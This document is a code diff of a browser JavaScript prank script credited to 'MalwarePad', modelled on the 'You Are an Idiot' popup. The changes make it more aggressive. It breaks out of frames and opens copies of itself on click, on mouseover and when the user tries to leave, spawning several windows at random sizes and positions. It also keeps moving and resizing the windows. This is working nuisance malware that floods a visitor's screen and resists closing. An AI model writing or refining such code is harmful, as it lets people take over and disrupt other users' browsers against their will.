@@ -1,68 +1,84 @@
-/* * Original Logic by MalwarePad 
-    * Adapted for modern browser execution
-*/
+/* * MalwarePad Logic + Random Resize & Spawn Chaos
+ */
 
 if (top.location != location) {
     top.location.href = location.href;
 }
 
+// 1. Random Spawning and Sizing
 function reopen() {
-    // We use window.location.href so it opens another copy of this same page
-    window.open(
-        window.location.href,
-        "win" + Math.random(),
-        "menubar=no,status=no,toolbar=no,resizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
-    );
+    // Generate random width and height between 200px and 500px
+    var w = Math.floor(Math.random() * 300) + 200;
+    var h = Math.floor(Math.random() * 300) + 200;
+
+    // Generate random spawn position within screen bounds
+    var x = Math.floor(Math.random() * (screen.availWidth - w));
+    var y = Math.floor(Math.random() * (screen.availHeight - h));
+
+    var winName = "idiot_" + Math.random().toString(36).substring(7);
+    var features = `width=${w},height=${h},left=${x},top=${y},menubar=no,status=no,toolbar=no,resizable=yes,scrollbars=yes`;
+    
+    var newWin = window.open(window.location.href, winName, features);
+    
+    if (newWin) {
+        newWin.focus();
+    }
 }
 
 function spam() {
-    for (var i = 0; i < 6; i++) { // Browsers block 10+, 6 is safer
+    for (var i = 0; i < 6; i++) {
         reopen();
     }
 }
 
+// 2. Entry Point
 function init() {
-    // Attach the "Idiot" behavior to everything
     document.body.onclick = reopen;
     document.body.onmouseover = reopen;
-    document.body.onmousemove = reopen;
     
-    // Attempt to spawn on close (Modern browsers often block this)
-    window.onunload = spam;
     window.onbeforeunload = spam;
 
-    playBall();
-
-    // Spawn the first popup immediately
-    reopen();
-    
-    // Close the original window after 10 seconds if it's a popup
     if (window.opener) {
-        setTimeout(function () {
-            window.close();
-        }, 10000);
+        playBall();
+    } else {
+        spam();
     }
 }
 
-var xOff = 5, yOff = 5, xPos = 400, yPos = -100, flagRun = true;
+// 3. The Bouncing & Resizing Loop
+var xOff = 5, yOff = 5, xPos = 400, yPos = 100;
+var flagRun = true;
 
-function newXlt() { xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10; window.focus(); }
+function newXlt() { xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10; }
 function newXrt() { xOff = Math.ceil(7 * Math.random()) * 5 - 10; }
 function newYup() { yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10; }
 function newYdn() { yOff = Math.ceil(7 * Math.random()) * 5 - 10; }
 
 function playBall() {
+    // Current window size
+    var winW = window.outerWidth;
+    var winH = window.outerHeight;
+
     xPos += xOff;
     yPos += yOff;
 
-    if (xPos > screen.width - 350) newXlt();
+    // Bounce logic
+    if (xPos > (screen.availWidth - winW)) newXlt();
     if (xPos < 0) newXrt();
-    if (yPos > screen.height - 370) newYup();
+    if (yPos > (screen.availHeight - winH)) newYup();
     if (yPos < 0) newYdn();
 
     if (flagRun) {
-        // This moves the actual browser window
         window.moveTo(xPos, yPos);
-        setTimeout(playBall, 1);
+
+        // RANDOM RESIZE LOGIC
+        // Every ~50 frames, change the window size randomly
+        if (Math.random() > 0.98) {
+            var newW = Math.floor(Math.random() * 300) + 200;
+            var newH = Math.floor(Math.random() * 300) + 200;
+            window.resizeTo(newW, newH);
+        }
+
+        setTimeout(playBall, 15);
     }
 }
